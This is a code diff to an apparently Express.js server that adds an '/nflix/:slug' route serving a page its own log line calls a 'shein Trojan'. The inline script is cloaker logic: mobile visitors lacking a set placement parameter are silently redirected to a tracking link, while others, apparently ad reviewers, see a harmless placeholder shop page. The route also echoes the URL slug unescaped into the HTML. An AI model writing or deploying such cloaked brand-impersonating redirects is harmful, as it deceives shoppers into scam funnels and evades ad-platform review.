@@ -137,6 +137,38 @@ app.get('/amazon/:slug', (req, res, next) => {
             res.send(trojanHTML);
             console.log(`Served shein Trojan (${slug})`);
 });
+// Middleware to pass on my slug values (SHEIN CA CAMP)
+app.get('/nflix/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tmtrcks.com/222898/969/`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
+});
 
 // Start the HTTP server
 const PORT = 8080;
